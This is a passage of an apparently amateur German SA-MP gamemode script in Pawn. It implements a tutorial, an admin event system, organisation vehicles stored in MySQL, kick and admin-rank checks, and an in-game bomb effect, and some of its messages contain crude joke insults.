	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	//SetPlayerPos(playerid,oldposx, oldposy, oldposz+3000);
	for(new x = 0; x<400; x++)
	{

		GetObjectPos(x, xx, yy, zz);

	if(IsPlayerInRangeOfPoint(playerid,3.0,xx,yy,zz))
	{
 		format(string, sizeof(string), "Object X: %f, Object Y: %f, Object Z: %f", xx,yy,zz);
   		SCM(playerid,-1,string);
   		return 1;
	}
	}
	SCM(playerid,-1,"Du stück drecks bist nicht in der nähe eines Objekts!");
	return 1;
}

stock WieVielAdminsOn()
{
	new count;
	for(new x = 0; x<MAX_PLAYERS; x++)
	{
		if(PlayerInfo[x][pAdmin]>=4)
		{
		    count++;
		}
	}
	return count;
}


Function stueckhurensohn(playerid)
{
    return ShowPlayerDialog(playerid,DIALOG_TUTORIAL_JANEIN,DIALOG_STYLE_MSGBOX,"Tutorial","Hi!\nSieht so aus als ob du neu auf dem Server bist.\nMöchtest du das Interaktive Tutorial machen?\nAm Ende erhälst du einen Startbonus!","Ja","Nein");
}
/*
ocmd:mvtorfs(playerid,prams[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 5, 787.2961,-1155.7571,23.6558) || IsPlayerInRangeOfPoint(playerid, 5, 662.7513,-1311.6553,13.4609)) return SCM(playerid,-1,"Du bist nicht bei dem Fahrschul Tor!");


}*/



ocmd:faq(playerid,params[])
{
    new sstring[512];
	strcat(sstring,"Wie kann ich das Tutorial wiederholen?\n");
	strcat(sstring,"Wie verdiene ich schnell Geld?\n");
	strcat(sstring,"Wie komme ich in eine Fraktion?\n");
	strcat(sstring,"Wie Gründe ich eine Organisation?\n");
	strcat(sstring,"Wie kann ich ein BIZ / Haus / Tanke erwerben?\n");
	strcat(sstring,"Wie werde ich Leader?\n");
	strcat(sstring,"Das Tutorial wird mir die ganze Zeit angezeigt\n");
 	ShowPlayerDialog(playerid, DIALOG_H11, DIALOG_STYLE_LIST, "{FFFFFF}FAQ", sstring, "Fragen", "Beenden");
 	return 1;
}

ocmd:resetcp(playerid,params[])
{
	if(TutStep[playerid]==0) return SCM(playerid,-1,"Du bist nicht im Tutorial!");
	switch(TutStep[playerid])
	{
	    case 1: // Die VOR Stadthalle wurde noch nicht erreicht. ( Erster CP Nicht erreicht)
	    {
	        SCM(playerid,COLOR_LIGHTBLUE,"Alles klar! Mit /carkey kannst du dein Fahrzeug auswählen und mit /findcar orten.");
		    SCM(playerid,COLOR_LIGHTBLUE,"Steig bitte in dein Fahrzeug ein und folge dem Checkpoint zur Stadthalle.");
		    SCM(playerid,COLOR_GRAD1,"*Falls dein Checkpoint aus irgendeinem Grund nicht da ist, kannst du ihn per /resetcp erneut setzen.");
		    SetPlayerCheckpoint(playerid,1481.0176,-1769.5886,18.7958,8.0);
		}
		case 2: // Der Erste CP wurde erreicht
		{
		    DisablePlayerCheckpoint(playerid);
 	    	ClearChatbox(playerid,20);
        	SetPlayerCheckpoint(playerid,362.7874,173.8484,1008.3828,8.0); // Stadthalle /stadthalle
		}
		case 3:
		{
	  		DisablePlayerCheckpoint(playerid);
	 	    ClearChatbox(playerid,20);
	 	    SCM(playerid,COLOR_LIGHTBLUE,"In der Stadthalle kannst du unter anderem einen Job annehmen, eine Organisation gründen oder Fähigkeiten für deine Organisation Freischalten!");
	        SCM(playerid,COLOR_LIGHTBLUE,"Oft steht die Stadthalle im Zentrum des Servers.");
	        SCM(playerid,COLOR_LIGHTBLUE,"* Bitte verlasse nun die Stadthalle und steige wieder in dein Fahrzeug.");
	        SetPlayerCheckpoint(playerid,1535.9557,-1672.6881,13.0856,8.0); // LSPD
		}
		case 4:
		{
		    DisablePlayerCheckpoint(playerid);
	 	   	ClearChatbox(playerid,20);
	 	    DisablePlayerCheckpoint(playerid);
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Hier befindet sich das Gebäude der Polzei und die Einsatzzentrale.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Wenn du ein Verbrechen begehst, dürfen Sie dich auch mit Gewalt festnehmen.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Auf unserem Server herrscht keine Bewerbungspflicht.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Du kannst per /leader die Nummern der verschiedenen Fraktionsleadern herausfinden und sie Kontaktieren.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Sobald du Level 3 erreicht hast kannst du einer Fraktion beitreten. Nach dem Tutorial wird dies als auswahl für den Startbonus hinzugefügt.");
	 	    SetPlayerCheckpoint(playerid,771.7474,-1345.2732,13.5253,8.0); // Mittelklasse Autos
		}
		case 5:
		{
  			ClearChatbox(playerid,20);
	 	    DisablePlayerCheckpoint(playerid);
	 	    ClearChatbox(playerid,20);
	 	    DisablePlayerCheckpoint(playerid);
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Hier kannst du dir Autos der Mittelklasse kaufen.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Du besitzt bereits ein Auto, im laufe der Zeit kannst du dir aber hier neue kaufen.");

	 	    SetPlayerCheckpoint(playerid,790.8717,-1278.8928,13.5469,8.0); // fahrschule
		}
		case 6:
		{
		    ClearChatbox(playerid,20);
	 	    DisablePlayerCheckpoint(playerid);
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Das hier ist die Fahrschule.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Du kannst hier alle möglichen Scheine machen.");

	 	    SetPlayerCheckpoint(playerid,1969.5035,-2203.6216,13.5469,8.0); // Flughafen
		}
		case 7:
		{
		    ClearChatbox(playerid,20);
	 	    DisablePlayerCheckpoint(playerid);
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Hier am Flugplatz von Los Santos fliegen viele Hobby oder Job Pilotenflieger ein.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Du kannst dir hier verschiedene Flugfahrzeuge kaufen.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Unter anderem kannst du für ein kleines Entgeld Fallschirm Springen!");

	 	    SetPlayerCheckpoint(playerid,1809.0544,-2428.0852,13.2414,8.0); // Tanke
		}
		case 8:
		{
            ClearChatbox(playerid,20);
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Das hier ein ein Biz / Geschäft.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Es gibt sie in den verschiedensten Formen in San Andreas.");
	 	    SCM(playerid,COLOR_LIGHTBLUE,"Wenn du etwas mehr Geld investierst kannst du dir selber ein lukratives Geschäft aufbauen.");
		}
	}
	return 1;
}

ocmd:tax(playerid,params[])
{
	new string[128];
    format(string, sizeof(string), "Die Steuern liegen derzeit bei %d % Prozent gerechnet auf dein Einkommen.", Tax);
    SCM(playerid,-1,string);
    return 1;
    //PlayerInfo[playa][pGehalt]
}

ocmd:budget(playerid,params[])
{
	if(PlayerInfo[playerid][pLeader]!=7) return SCM(playerid,-1,"Du bist nicht der Präsident!");

    ShowPlayerDialog(playerid,DIALOG_FBUDGET,DIALOG_STYLE_LIST,"Budget","LSPD\nFBI\nArmy","Setzen","Abbrechen");
    return 1;
}


stock SanNewsMsg(nachricht[])
{
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
	    if(PlayerInfo[i][pMember] == 9)
	    {
	        SCM(i,-1,nachricht);
		}
	}
}








ocmd:event(playerid,params[])
{
    if(PlayerInfo[playerid][pAdmin]<4) return SCM(playerid,-1,"Du bist nicht berechtigt!");

    ShowPlayerDialog(playerid,DIALOG_EVSYS,DIALOG_STYLE_LIST,"Event","Event Starten\nEvent Stoppen\nEvent Konfigurieren","Fortfahren","Abbrechen");
    return 1;
}








stock GetEventName()
{
	new string[256];
	if(Event[EventArt] <2)
	{
	    format(string, sizeof(string), "Optional");
	}
	if(Event[EventArt] == 2)
	{
		format(string, sizeof(string), "GranatenBall");
	}
	return string;
}


stock EventStart(EventOwner)
{
    if(EventOwner != INVALID_PLAYER_ID)
    {
        Event[EventOwnerID] = EventOwner;
	    new string[256];
		format(string, sizeof(string), "*** Administrator %s hat ein Event gestartet! (%s) *** ", GetName(EventOwner),GetEventName());
		SendClientMessageToAll(EVENTCOLOR,string);
		// EventInterior
		for(new i = 0; i<MAX_PLAYERS; i++)
		{
		    if(i != EventOwner || PlayerInfo[i][pAdmin]<4)
		    {
		        if(WantedLevel[i]>=1) continue;        // Du kannst nicht am Event teilnehmen, weil ...
		        if(PlayerInfo[i][pPrison] == 1)continue;
			    if(PlayerInfo[i][pTot] == 1)continue;
			    if(PlayerInfo[i][pJailed] != 0)continue;
			    if(GetPlayerInterior(i) !=0) continue;
			    if(GetPlayerVirtualWorld(i) !=0) continue;
			    if(PlayerInfo[i][pGenerellFreezed] == 1)continue;
			    if(PlayerCuffed[i] == 1) continue;
			  //  if(IsPlayerInAnyVehicle(i)) continue;
			 //   if(WantedLevel[i] >= 1) continue;
			    if(PlayerInfo[i][pPrisonCPs] > 0) continue;
			    if(PlayerInfo[i][pHeadValue]>=1) continue; // vlt alles mal adminmäßig einstellen lassen


			    format(string, sizeof(string), "Administrator %s hat ein Event gestartet: %s\nMöchtest du teilnehmen? ", GetName(EventOwner),GetEventName());
			    ShowPlayerDialog(i,DIALOG_EVSYSTEILNEHMEN,DIALOG_STYLE_MSGBOX,"Beim Event teilnehmen?",string,"Ja!","Nein!");

			}
		}
		if(Event[EventArt] == 2)  // granatenball
		{
			Event[EventInterior] = 10;
			Event[EventVWOk] = 2; // virtuelle welt
		}

		Event[EventEdit] = 0;
		Event[EventActive] = 1;
		SCM(EventOwner,EVENTCOLOR,"[EventSystem]: Event Gestartet!");
		format(string, sizeof(string), "[EventSystem]: Event Art: %s, Event Int: %d, Event MaxPlayers: %d, Event MinPlayers: %d, EventWarteZeit: %d:00 Minuten", GetEventName(),Event[EventInterior],Event[EventMaxPlayers],Event[EventMinPlayers],Event[EventWarteZeit]);
	 	SCM(EventOwner,EVENTCOLOR,string);

	 	Event[EventUpdateTimer] = SetTimer("EventUpdate",20000,1);

	}

}
// eventupdate get event players


Function EventUpdate()  // wiederholen
{

	new string[256];
	if(Event[EventActive] == 1)
	{
	    if(Event[EventGestartet] == 0)
	    {
	        SendEventMessage("*** Event ****");
	        if(GetEventCurrentPlayers() >= Event[EventMinPlayers])
			{
				format(string, sizeof(string), "Die Event-Spielerzahl beträgt %d! Das Event wird in wenigen momenten gestartet!", GetEventCurrentPlayers());
				SendEventMessage(string);
				SetTimer("EventStartenJetzt",Event[EventWarteZeit] * 1000 * 60,0);  // Event Gestartet & Ende setzen   &  &IN SEKUJDNEn
				//EventStartenJetzt();
				return 1;
			}
			else if(GetEventCurrentPlayers() < Event[EventMinPlayers])
			{
			    format(string, sizeof(string), "Die Event-Spielerzahl beträgt %d! Die minimale Spielerzahl wurde noch nicht erreicht!", GetEventCurrentPlayers());
				SendEventMessage(string);
				return 1;
			}
		}
	}
	return 1;
}


Function EventStartenJetzt()
{
    if(Event[EventActive] == 1)
	{
	    Event[EventGestartet] = 1;
     	Event[EvCountDown] = 10;
      	EventCountDownTimer = SetTimer("EventCountDown",1000,true);
       SetTimer("EventFinalStart",10000,0); // läuft eh nur 10 sek aber egal
  	}
}


Function EventFinalStart()
{
    for(new i = 0; i<MAX_PLAYERS; i++)
	{
		if(PlayerInfo[i][AktivImEvent] == 1)
		{
			TogglePlayerControllable(i,true);
			GiveEventWeapons();


			//SetTimer("EventEnde",Event[EventZeit] * 60 * 1000,0);  // warum war das hier vorher?
// eventende

		}
	}

	SetTimer("EventEnde",Event[EventZeit] * 60 * 1000,0);

	SetTimer("EventSetTime",1000,1);

	Event[EventMinuten] = Event[EventZeit];



}


Function EventEnde()
{
	if(Event[EventActive] == 1)
	{
	    new Player,string[128];
		for(new i=0; i<MAX_PLAYERS; i++)
		{
		    if(PlayerInfo[i][AktivImEvent] == 1)
			{
		         if(PlayerInfo[i][EventKills] > PlayerInfo[i][EventKills]) Player = i;

		         PlayerInfo[i][AktivImEvent] = 0;
		         ResetPlayerWeapons(i);
		         SetPlayerInterior(i,0);
		         SetPlayerVirtualWorld(i,0);
		         TextDrawHideForPlayer(i,TextDraw_EventZeit[0]);
		         SpawnPlayer(i);
		    }

	 	}
	 	if(Event[AdminEnde] == 1)
	 	{
	 	    SendClientMessageToAll(-1,"Admin-Ende");
	 	    if(Event[AdminEndeWer] != INVALID_PLAYER_ID)
	 	    {
	 	        format(string, sizeof(string), "Admin %s hat das Event %s Beendet!", GetName(Event[AdminEndeWer]),GetEventName());
				SendClientMessageToAll(-1,string);
			}
			Event[EventActive] = 0;
			Event[EventGestartet] = 0;

			Event[EventArt] = 0;
			Event[EventActive] = 0;

			Event[EventZeit] = 0;
			Event[EventInterior] = 0;
			Event[EventVWOk] = 0;
			Event[EventMaxPlayers] = 0;
			Event[EventMinPlayers] = 0;
			Event[EventWarteZeit] = 0;
			Event[EvCountDown] = 0;
			Event[EventUpdateTimer] = 0;
			Event[EventOwnerID] = INVALID_PLAYER_ID;

			Event[AdminEnde] = 0;

			Event[AdminEndeWer] = INVALID_PLAYER_ID;
			KillTimer(Event[EventUpdateTimer]);
			KillTimer(EventCountDownTimer);
			return 1;
		}
	 	format(string, sizeof(string), "%s hat das Event %s Gewonnen und erhält 35000$ + 3 Respektpunkte !", GetName(Player),GetEventName());
		SendClientMessageToAll(-1,string);
		GivePlayerMoneySave(Player,35000);

		PlayerInfo[Player][pExp] +=3;


		Event[EventActive] = 0;
		Event[EventGestartet] = 0;

		Event[EventArt] = 0;
		Event[EventActive] = 0;
		Event[EventZeit] = 0;
		Event[EventInterior] = 0;
		Event[EventVWOk] = 0;
		Event[EventMaxPlayers] = 0;
		Event[EventMinPlayers] = 0;
		Event[EventWarteZeit] = 0;
		Event[EvCountDown] = 0;
		Event[EventUpdateTimer] = 0;
		Event[EventOwnerID] = INVALID_PLAYER_ID;

		Event[AdminEnde] = 0;

		Event[AdminEndeWer] = INVALID_PLAYER_ID;
		KillTimer(Event[EventUpdateTimer]);
		KillTimer(EventCountDownTimer);
		/*

			EventOwnerID,
		EventArt,
		EventActive,
		EventZeit,
		Float:EventX,
		Float:EventY,
		Float:EventZ,
		EventInterior,
		EventVWOk,
		EventMaxPlayers,
		EventMinPlayers,
		EventPlayers,
		EventEdit,
		EventWarteZeit,
		EventGestartet,
		EvCountDown,
		EventUpdateTimer,*/
		return 1;
	}
	return 1;

}
forward EventCountDown();
public EventCountDown()
{
	new str[100];
	if(Event[EventActive] == 1)
	{
	    Event[EvCountDown]--;
	    if(Event[EvCountDown] > 0)
	    {
	        format(str, sizeof(str), "Count Down: %d",Event[EvCountDown]);
	        SendEventGameText(str,1000);

		}
		else
		{
		    SendEventGameText("~r~GO ~b~GO ~p~GO",1000);
		    Event[EvCountDown] = 0;
			KillTimer(EventCountDownTimer); // keine weiteren publics ausgeführt, da man EventCountDown so allgemeiner und nicht nur für den start nutzen kann
		}

	}
}

Function GiveEventWeapons()
{
	if(Event[EventActive] == 1)
	{
 		for(new i = 0; i<MAX_PLAYERS; i++)
		{
			if(PlayerInfo[i][AktivImEvent] == 1)
	  		{
			    if(Event[EventArt] == 2)
			    {
					ServerWeapon(i,16,999);
				}
			}
		}
	}
}
Function SendEventGameText(gametext[],millisekunden)
{
    for(new i = 0; i<MAX_PLAYERS; i++)
	{
		if(PlayerInfo[i][AktivImEvent] == 1)
		{
  			GameTextForPlayer(i,gametext,millisekunden,3); // letzer stil
		}
	}
}
Function SendEventMessage(msg[])
{
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
		if(PlayerInfo[i][AktivImEvent] == 1 || PlayerInfo[i][pAdmin]>4)
  		{
            SCM(i,-1,msg);
		}
	}
}
Function GetEventCurrentPlayers()
{
    new evcounter;
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
		if(PlayerInfo[i][AktivImEvent] == 1)
  		{
    		evcounter++;
		}
	}
	return evcounter;
}


//7 EventGestartet

/*

enum EventSystem{
	EventOwnerID,
	EventArt,
	EventActive,
	EventZeit,
	Float:EventX,
	Float:EventY,
	Float:EventZ,
	EventInterior,
	EventVWOk,
	EventMaxPlayers,
	EventMinPlayers,
	EventPlayers,
	EventEdit,
	EventWarteZeit,
	EventGestartet
};*/




forward SaveORGAutos(theorgcarid);
public SaveORGAutos(theorgcarid)
{
    new query[512];
	format(query, sizeof(query), "UPDATE `orgautos` SET orgautox = '%f',orgautoy = '%f',orgautoz = '%f',orgautor = '%f',orgautocolor = '%d',orgautocolor2 = '%d',orgautokaufpreis = '%d' WHERE `autoid` = '%d'",  // org id wird ja direkt inserted
	OrgAuto[theorgcarid][orgautox],OrgAuto[theorgcarid][orgautoy],OrgAuto[theorgcarid][orgautoz],OrgAuto[theorgcarid][orgautor],
	OrgAuto[theorgcarid][orgautocolor],OrgAuto[theorgcarid][orgautocolor2],OrgAuto[theorgcarid][orgautokaufpreis],OrgAuto[theorgcarid][orgautodbid]);
	printf(query);
//	mysql_function_query(mysqlcon,query, false, "", "");
    mysql_pquery(mysqlcon,query,"");
	SendClientMessageToAll(-1,"Okay!");


	return 1;
}





stock OrgAutoErstellen(playerid,orgid,autoid,autopreis)
{
    new fc = getFreeorgautoid();

	   			OrgAuto[fc][orgvehtype] = autoid;
	    		new Float:fX,Float:fY,Float:fZ,Float:fA;
	    		GetPlayerPos(playerid,fX,fY,fZ),GetPlayerFacingAngle(playerid,fA);

	  	 		OrgAuto[fc][orgautox] = fX;
	    		OrgAuto[fc][orgautoy] = fY;
	    		OrgAuto[fc][orgautoz] = fZ;
	    		OrgAuto[fc][orgautor] = fA;
	    		OrgAuto[fc][orgautocolor] = 1;
	   			OrgAuto[fc][orgautocolor2] = 1;

	   			OrgAuto[fc][autoorgid] = orgid;



				//FactionCars[fc][fPrice] = 0;

				OrgAuto[fc][LocalID] = CreateVehicle(OrgAuto[fc][orgvehtype],OrgAuto[fc][orgautox],OrgAuto[fc][orgautoy],OrgAuto[fc][orgautoz],OrgAuto[fc][orgautor],OrgAuto[fc][orgautocolor],OrgAuto[fc][orgautocolor2],-1, 0);
				//Gas[FactionCars[fc][fCarid]] = 80;
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Organisations Fahrzeug erfolgreich gekauft!");
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Vergesse es nicht mit '/parken' umzuparken.");
				PutPlayerInVehicle(playerid,OrgAuto[fc][LocalID],0);
				OrgInfo[orgid][FahrzeugeRows]++;
				OrgInfo[orgid][OrgKasse]-=autopreis;
				SaveORGcarToDB(fc);

}
ocmd:orgauto(playerid,params[]){  /// FactionCars[fc][fVehid] wird verwendet irgendwo noch... oder ?
	        if(PlayerInfo[playerid][pAdmin] == 2002)
			{
				new vehid,col1,col2,orgid;
		    	if(sscanf(params,"dddd",vehid,col1,col2,orgid)) return SendClientMessage(playerid,FACTION_COL_GREY,"Benutze: '/orgauto [Model] [Farbe(1)] [Farbe(2)] [OrgID]'.");
				if(vehid < 400 || vehid > 611) return SendClientMessage(playerid,FACTION_COL_GREY,"Vehicle-ID nur von 400 bis 611.");
				if(col1 < 0 || col1 > 255) return SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Farbe(1)!");
				if(col2 < 0 || col2 > 255) return SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Farbe(2)!");
				if(orgid == 0) return SCM(playerid,-1,"OrgID kann nicht 0 sein");
				//new fc = getFreeorgautoid();
				for(new fc=0; fc<sizeof(OrgAuto); fc++)
				{
				//printf("FreeORGID == %d",fc);
	   			OrgAuto[fc][orgvehtype] = vehid;
	    		new Float:fX,Float:fY,Float:fZ,Float:fA;
	    		GetPlayerPos(playerid,fX,fY,fZ),GetPlayerFacingAngle(playerid,fA);

	  	 		OrgAuto[fc][orgautox] = fX;
	    		OrgAuto[fc][orgautoy] = fY;
	    		OrgAuto[fc][orgautoz] = fZ;
	    		OrgAuto[fc][orgautor] = fA;
	    		OrgAuto[fc][orgautocolor] = col1;
	   			OrgAuto[fc][orgautocolor2] = col2;

	   			OrgAuto[fc][autoorgid] = orgid;



				//FactionCars[fc][fPrice] = 0;

				OrgAuto[fc][LocalID] = CreateVehicle(OrgAuto[fc][orgvehtype],OrgAuto[fc][orgautox],OrgAuto[fc][orgautoy],OrgAuto[fc][orgautoz],OrgAuto[fc][orgautor],OrgAuto[fc][orgautocolor],OrgAuto[fc][orgautocolor2],-1, 0);
				//Gas[FactionCars[fc][fCarid]] = 80;
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Organisations Fahrzeug erfolgreich erstellt.");
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Vergesse es nicht mit '/parken' umzuparken.");
				PutPlayerInVehicle(playerid,OrgAuto[fc][LocalID],0);
				SaveORGcarToDB(fc);
				return 1;
				}

			}else SendClientMessage(playerid,FACTION_COL_GREY,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
			return 1;
}

forward SaveORGcarToDB(fc);
public SaveORGcarToDB(fc)
{
	new query[512];
    format(query,sizeof(query),"INSERT INTO orgautos (orgid,orgvehtype,orgautox,orgautoy,orgautoz,orgautor,orgautocolor,orgautocolor2,orgautokaufpreis) VALUES ('%d','%d','%f','%f','%f','%f','%d','%d','%d')",
	OrgAuto[fc][autoorgid],OrgAuto[fc][orgvehtype],OrgAuto[fc][orgautox],OrgAuto[fc][orgautoy],OrgAuto[fc][orgautoz],OrgAuto[fc][orgautor],OrgAuto[fc][orgautocolor],OrgAuto[fc][orgautocolor2],OrgAuto[fc][orgautokaufpreis]);


    //mysql_function_query(mysqlcon,query,true,"OnORGAutoCreated","i",fc);
    mysql_pquery(mysqlcon, query, "OnORGAutoCreated", "i",fc);
    return 1;
}
forward OnORGAutoCreated(fc);
public OnORGAutoCreated(fc)
{
	//printf("OnORGAutoCreated wurde auf"
	OrgAuto[fc][orgautodbid] = cache_insert_id();
	SendClientMessageToAll(-1,"Du bist hässlich und was noch ?");



	for( new u; u < MAX_PLAYERS; u++ )
	{
	    if(u != INVALID_PLAYER_ID)
	    {
    		PlayAudioStreamForPlayer(u, "https://blanknamedddddd.000webhostapp.com/SpongeBob_ - Ich (mp3cut.net).mp3" );
		}
	}
	return 1;
}



//autoorgid
/*
enum OrgAutosInfo
{
	LocalID,
	orgautodbid,
	autoorgid,
	orgvehtype,
	Float:orgautox,
	Float:orgautoy,
	Float:orgautoz,
	Float:orgautor,
	orgautocolor,
	orgautocolor2,
	orgautokaufpreis
}*/

getFreeorgautoid()
{
	for(new i=0; i<sizeof(OrgAuto); i++)
	{
	   if(OrgAuto[i][orgautodbid]==-1) return i;
	}
	ABroadCast(0xFF0000FF, "Error: Maximale Anzahl an Org Autos erreicht.",1);

	return -1;
}



ocmd:handy(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SCM(playerid,-1,"Du bist noch nicht Eingeloggtt!");

    if(PlayerInfo[playerid][pOrgMember] == 0)
    {
    	return ShowPlayerDialog(playerid,DIALOG_HANDY,DIALOG_STYLE_LIST,"Handy","Uhrzeit\nSMS\nAnrufen","Auswählen","Abbrechen");
	}
	else
	{
	    return ShowPlayerDialog(playerid,DIALOG_HANDY,DIALOG_STYLE_LIST,"Handy","Uhrzeit\nSMS\nAnrufen\nOrganisation","Auswählen","Abbrechen");
	}
}






forward EventSetTime();
public EventSetTime()
{
   	new string[128];
	Event[EventSekunden]--;
	if(Event[EventSekunden]<=1)
	{
	    Event[EventMinuten]--;
	    Event[EventSekunden] = 60;
	  //  TextDrawSetString(TextDraw_EventZeit[1], Event[EventSekunden]);
	  //  TextDrawSetString(TextDraw_EventZeit[0], Event[EventMinuten]);
		if(Event[EventMinuten] == 1)
		{
		    Event[EventMinuten] = 0; // letzte Minute
   			format(string, sizeof(string), "%02d:%02d", Event[EventMinuten], Event[EventSekunden]);
   			TextDrawSetString(TextDraw_EventZeit[0], string);
		}
	}
//	TextDrawSetString(TextDraw_EventZeit[1], Event[EventSekunden]);
    format(string, sizeof(string), "%02d:%02d", Event[EventMinuten], Event[EventSekunden]);
	TextDrawSetString(TextDraw_EventZeit[0], string);
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
		if(PlayerInfo[i][AktivImEvent] == 1)
		{
		  //  TextDrawHideForPlayer(i,TextDraw_EventZeit[0]);
		  //  TextDrawHideForPlayer(i,TextDraw_EventZeit[1]);

		  //  TextDrawShowForPlayer(i,TextDraw_EventZeit[0]);
   			TextDrawShowForPlayer(i,TextDraw_EventZeit[0]);
		}
	}
}
ocmd:gsset(playerid,params[])
{
    new neu;
    AdminNoetig(playerid,4);
   	if(sscanf(params,"d",neu)) return SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /gsset [gs] ");
    geschwindigkeit =  neu;
   	return 1;
    //AntiAdminAbuse[playerid]++;
}


ocmd:kick(playerid,params[])
{
    new pid,Grund[84],string[128];
    //
    if(PlayerInfo[playerid][pAdmin]<4) return SCM(playerid, COLOR_GRAD1, "Du benötigst mindestens den Supporter-Rang um fortfahren zu können.");
	//if(AdminNoetig(playerid,4)
   	if(sscanf(params,"us",pid,Grund)) return SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /kick [playerid] [Grund]");
   	if(strlen(Grund) >50) return SCM(playerid,-1,"Maximal 50 Zeichen!");
   	if(PlayerInfo[pid][pAdmin] > PlayerInfo[playerid][pAdmin])
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht kicken, da er ein höheres Adminlevel hat als du!");
		return 1;
	}


   	AntiAdminAbuse[playerid]++;
	new year, month,day;
	getdate(year, month, day);
	format(string, sizeof(string), "AdmCmd: %s wurde von %s gekickt, Grund: %s (%d-%d-%d)", GetName(pid), GetName(playerid), Grund,month,day,year);
	KickLog(string);
	format(string, sizeof(string), "AdmCmd: %s wurde von %s gekickt, Grund: %s", GetName(pid), GetName(playerid), Grund);
	SendClientMessageToAll(COLOR_LIGHTRED, string);

	SetTimerEx("kicktimer", 300,false,"i",pid);
   	return 1;
    //AntiAdminAbuse[playerid]++;
}

stock AdminNoetig(playerid,AdMReq)
{
	if(PlayerInfo[playerid][pAdmin] == 0) return SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht berechtigt.");
	else if(AdMReq == 4 && PlayerInfo[playerid][pAdmin]<4) return SendClientMessage(playerid, COLOR_GRAD1, "Du benötigst mindestens den Supporter-Rang um fortfahren zu können.");
	else if(AdMReq == 1337 && PlayerInfo[playerid][pAdmin]<1337) return SendClientMessage(playerid, COLOR_GRAD1, "Du benötigst mindestens den Moderator-Rang um fortfahren zu können.");
	else if(AdMReq == 1338 && PlayerInfo[playerid][pAdmin]<1338) return SendClientMessage(playerid, COLOR_GRAD1, "Du benötigst mindestens den Admin-Rang um fortfahren zu können.");
	else if(AdMReq == 2000 && PlayerInfo[playerid][pAdmin]<2000) return SendClientMessage(playerid, COLOR_GRAD1, "Du musst Head Admin sein, um diesen Befehl nutzen zu können.");
	else if(AdMReq == 2002 && PlayerInfo[playerid][pAdmin]<2002) return SendClientMessage(playerid, COLOR_GRAD1, "Du musst teil der Projektleitung sein, um fortfahren zu können.");
	return 1;
}



ocmd:orgvw(playerid,params[])
{
	// MemberBerechtigungen // Fahrzeuge // Base // Bizz // MitglieederVerwlautng?

	new org = PlayerInfo[playerid][pOrgMember];
	if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
	if(PlayerInfo[playerid][pOrgLeader] != org) return SendClientMessage(playerid,COLOR_GREY,"Du bist kein ORG Leader");

	ShowPlayerDialog(playerid,DIALOG_ORGVW,DIALOG_STYLE_LIST,"Organisationsverwaltung","Berechtigungen\nORG Fahrzuege\nORG Bizz\nBase","Auswählen","Abbrechen");
	return 1;
}
//TextDraw_EventZeit










stock Bombee(playerid)
{
	new Float:xd,Float:yd,Float:zd;
	GetVehiclePos(GetPlayerVehicleID(playerid),xd,yd,zd);
	Bombe[bombid] = CreateObject(1636,xd,yd,zd-2,0.0,0.0,0.0,0.0);
//	MapAndreas_FindZ_For2DCoord(xd,yd,zd);
	new movetime = MoveObject(Bombe[bombid],xd,yd,zd,geschwindigkeit,0);

	movetime-=500;


	SetTimerEx("EinSchlag", movetime, false, "ifff", Bombe[bombid],xd, yd, zd);
	return 1;
}

forward EinSchlag(b,Float:xx,Float:yy,Float:zz);
public EinSchlag(b,Float:xx,Float:yy,Float:zz)
{
    CreateExplosion(xx,yy,zz, 7, 20.0);
    DestroyObject(b);
    Bombe[bombid]=0;
    SendClientMessageToAll(-1,"BOOOOOOOM");
	return 1;
}
/*
new Float:hax,Float:hay,Float:haz;
	    GetObjectPos(Bombe[bombid],hax,hay,haz);
	    CreateExplosion(hax,hay,haz,12,10.0);

		DestroyObject(Bombe[bombid]);

		SendClientMessageToAll(-1,"BOOOOOOOM");*/


/*
stock FindFreeBombe()
{
	for(new i=0;i<Max_Bomben;i++)
	{
	    if(bombe[i][bobjectid]==0)return i;
	}
	return -1;
}*/

/*
ocmd:sirenensohn(playerid,params[])
{
	if(GetPlayerVehicleID(playerid) == INVALID_VEHICLE_ID) return SCM(playerid,-1,"Junge du sitzt in KEINEM Fahrzeug");
	new temp = GetPlayerVehicleID(playerid);
	new Float:x,Float:y,Float:z,Float:r;
	GetVehiclePos(temp,x,y,z);
	GetVehicleZAngle(temp,r);
	CreateVehicle(temp,x,y,z,r,1,1,-1,1);
	return 1;
	//CreateVehicle(
}*/


ocmd:sirenensohn(playerid,params[])
{
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,-1,"Junge du sitzt in KEINEM Fahrzeug");
	if(GetPlayerVehicleID(playerid) == INVALID_VEHICLE_ID) return SendClientMessage(playerid,-1,"Junge du sitzt in KEINEM VALIDEN Fahrzeug");
	new temp = GetPlayerVehicleID(playerid);
